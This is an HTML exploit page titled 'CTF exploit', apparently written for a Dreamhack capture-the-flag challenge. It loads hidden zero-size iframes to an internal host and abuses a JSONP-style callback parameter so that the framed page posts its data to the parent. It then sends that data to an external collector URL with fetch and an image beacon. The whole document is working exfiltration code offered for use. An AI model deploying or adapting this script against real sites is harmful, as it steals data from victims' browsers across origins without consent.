<!doctype html>
<meta charset="utf-8">
<title>CTF exploit</title>
<script>
const EXFIL_URL = "https://ucurxln.request.dreamhack.games/collect?d=";

window.addEventListener('message', (ev) => {
  try {
    const data = ev.data && (typeof ev.data === 'string' ? {info: ev.data} : ev.data);
    const msg = (data && (data.info ?? data)) + "";
    try { fetch(EXFIL_URL + encodeURIComponent(msg)); } catch (e) {}
    try { (new Image).src = EXFIL_URL + encodeURIComponent(msg); } catch (e) {}
  } catch (e) {}
});

const f1 = document.createElement('iframe');
f1.src = "http://home:8001/post";
f1.style.cssText = "width:0;height:0;border:0;";
document.body.appendChild(f1);

setTimeout(() => {
  const f2 = document.createElement('iframe');
  f2.src = "http://home:8001/callback?callback=parent.postMessage";
  f2.style.cssText = "width:0;height:0;border:0;";
  document.body.appendChild(f2);
}, 1500);
</script>
<p>Workingâ€¦</p>
